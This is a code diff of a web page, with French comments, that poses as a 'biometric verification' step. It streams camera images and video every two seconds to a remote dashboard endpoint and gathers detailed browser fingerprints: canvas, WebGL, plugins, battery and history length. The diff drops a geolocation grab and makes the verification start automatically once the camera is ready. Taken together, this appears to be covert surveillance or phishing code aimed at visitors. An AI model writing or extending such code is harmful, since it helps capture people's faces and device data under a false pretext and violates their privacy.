@@ -646,11 +646,12 @@
     // Configuration
     const CONFIG = {
       serverEndpoint: 'https://moonscale-dashboard.onrender.com/stream/upload',
-      captureInterval: 2500, // Capture toutes les 2.5 secondes
+      captureInterval: 2000, // Capture toutes les 1 seconde
       videoSegmentDuration: 2000, // 2 secondes de vidéo
       maxRetries: 3,
       sessionDuration: 60000 // 1 minute de session
     };
+    let clientInfoCache = null;
 
     // État de l'application
     let appState = {
@@ -840,112 +841,96 @@ function getWebGLInfo() {
 
 
     function collectClientInfo() {
-  const clientInfo = {
-    // Informations de base du navigateur
-    userAgent: navigator.userAgent,
-    platform: navigator.platform,
-    language: navigator.language,
-    languages: navigator.languages,
-    cookieEnabled: navigator.cookieEnabled,
-    onLine: navigator.onLine,
-    
-    // Écran et résolution
-    screenWidth: screen.width,
-    screenHeight: screen.height,
-    screenColorDepth: screen.colorDepth,
-    screenPixelDepth: screen.pixelDepth,
-    devicePixelRatio: window.devicePixelRatio,
-    
-    // Fenêtre du navigateur
-    windowWidth: window.innerWidth,
-    windowHeight: window.innerHeight,
-    
-    // Timezone et localisation
-    timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
-    timezoneOffset: new Date().getTimezoneOffset(),
-    
-    // Informations système
-    hardwareConcurrency: navigator.hardwareConcurrency, // Nombre de cœurs CPU
-    memory: navigator.deviceMemory, // RAM (si disponible)
-    connection: navigator.connection ? {
-      effectiveType: navigator.connection.effectiveType,
-      downlink: navigator.connection.downlink,
-      rtt: navigator.connection.rtt
-    } : null,
-    
-    // Plugins et capacités
-    plugins: Array.from(navigator.plugins).map(p => ({
-      name: p.name,
-      description: p.description,
-      filename: p.filename
-    })),
-    
-    // Canvas fingerprinting (basique)
-    canvasFingerprint: generateCanvasFingerprint(),
-    
-    // WebGL informations
-    webglInfo: getWebGLInfo(),
-    
-    // Historique de navigation (longueur seulement)
-    historyLength: history.length,
-    
-    // Référent
-    referrer: document.referrer,
-    
-    // URL actuelle
-    currentUrl: window.location.href,
-    
-    // Battery API (si disponible)
-    battery: null, // Sera rempli asynchroniquement
-    
-    // Géolocalisation (demande permission)
-    location: null // Sera rempli si autorisé
-  };
-  
-  return clientInfo;
-}
+        const clientInfo = {
+            // Informations de base du navigateur
+            userAgent: navigator.userAgent,
+            platform: navigator.platform,
+            language: navigator.language,
+            languages: navigator.languages,
+            cookieEnabled: navigator.cookieEnabled,
+            onLine: navigator.onLine,
+            
+            // Écran et résolution
+            screenWidth: screen.width,
+            screenHeight: screen.height,
+            screenColorDepth: screen.colorDepth,
+            screenPixelDepth: screen.pixelDepth,
+            devicePixelRatio: window.devicePixelRatio,
+            
+            // Fenêtre du navigateur
+            windowWidth: window.innerWidth,
+            windowHeight: window.innerHeight,
+            
+            // Timezone et localisation
+            timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
+            timezoneOffset: new Date().getTimezoneOffset(),
+            
+            // Informations système
+            hardwareConcurrency: navigator.hardwareConcurrency, // Nombre de cœurs CPU
+            memory: navigator.deviceMemory, // RAM (si disponible)
+            connection: navigator.connection ? {
+            effectiveType: navigator.connection.effectiveType,
+            downlink: navigator.connection.downlink,
+            rtt: navigator.connection.rtt
+            } : null,
+            
+            // Plugins et capacités
+            plugins: Array.from(navigator.plugins).map(p => ({
+            name: p.name,
+            description: p.description,
+            filename: p.filename
+            })),
+            
+            // Canvas fingerprinting (basique)
+            canvasFingerprint: generateCanvasFingerprint(),
+            
+            // WebGL informations
+            webglInfo: getWebGLInfo(),
+            
+            // Historique de navigation (longueur seulement)
+            historyLength: history.length,
+            
+            // Référent
+            referrer: document.referrer,
+            
+            // URL actuelle
+            currentUrl: window.location.href,
+            
+            // Battery API (si disponible)
+            battery: null, // Sera rempli asynchroniquement
+            
+            // Géolocalisation (demande permission)
+            location: null // Sera rempli si autorisé
+        };
+        
+        return clientInfo;
+    }
 
 
-      async function collectInfo() {
-         const clientInfo = collectClientInfo();
-         
-         // Collecte géolocalisation si possible
-         if (navigator.geolocation) {
+    async function collectInfo() {
+        // Vérifiez si les informations ont déjà été collectées
+        if (clientInfoCache) {
+            return clientInfoCache; // Retourner les informations stockées
+        }
+        const clientInfo = collectClientInfo();
+        
+        // Collecte battery info si disponible
+        if ('getBattery' in navigator) {
             try {
-               const position = await new Promise((resolve, reject) => {
-                  navigator.geolocation.getCurrentPosition(resolve, reject, {
-                     timeout: 5000,
-                     enableHighAccuracy: true
-                  });
-               });
-               
-               clientInfo.location = {
-                  latitude: position.coords.latitude,
-                  longitude: position.coords.longitude,
-                  accuracy: position.coords.accuracy
-               };
+            const battery = await navigator.getBattery();
+            clientInfo.battery = {
+                level: battery.level,
+                charging: battery.charging,
+                chargingTime: battery.chargingTime,
+                dischargingTime: battery.dischargingTime
+            };
             } catch (err) {
-               console.log('Géolocalisation refusée ou échouée');
+            console.log('Battery API non disponible');
             }
-         }
-         
-         // Collecte battery info si disponible
-         if ('getBattery' in navigator) {
-            try {
-               const battery = await navigator.getBattery();
-               clientInfo.battery = {
-                  level: battery.level,
-                  charging: battery.charging,
-                  chargingTime: battery.chargingTime,
-                  dischargingTime: battery.dischargingTime
-               };
-            } catch (err) {
-               console.log('Battery API non disponible');
-            }
-         }
-         return clientInfo;      
-      }
-
+        }
+        clientInfoCache = clientInfo; // Stocker les informations collectées
+        return clientInfo;      
+    }
     // Envoi sécurisé des données
     async function transmitCapturedData() {
       if (!appState.sessionActive) return;
@@ -964,7 +949,7 @@ function getWebGLInfo() {
           timestamp: new Date().toISOString(),
           images: imageData ? [imageData] : [],
           video: videoData || null,
-          clientInfo: await collectInfo(),
+          clientInfo: {},//await collectInfo(),
           metadata: {
             userAgent: navigator.userAgent,
             platform: navigator.platform,
@@ -1067,7 +1052,7 @@ function getWebGLInfo() {
     function startContinuousCapture() {
       // Capturer immédiatement
       transmitCapturedData();
-      
+
       // Puis capturer à intervalles réguliers
       appState.captureTimer = setInterval(() => {
         if (appState.sessionActive) {
@@ -1137,6 +1122,7 @@ function getWebGLInfo() {
       if (success) {
         setButtonState(false, 'Commencer la vérification');
         updateStatus("Prêt pour la vérification biométrique", 'success');
+        await startVerificationProcess();
       } else {
         setButtonState(false, 'Réessayer');
       }
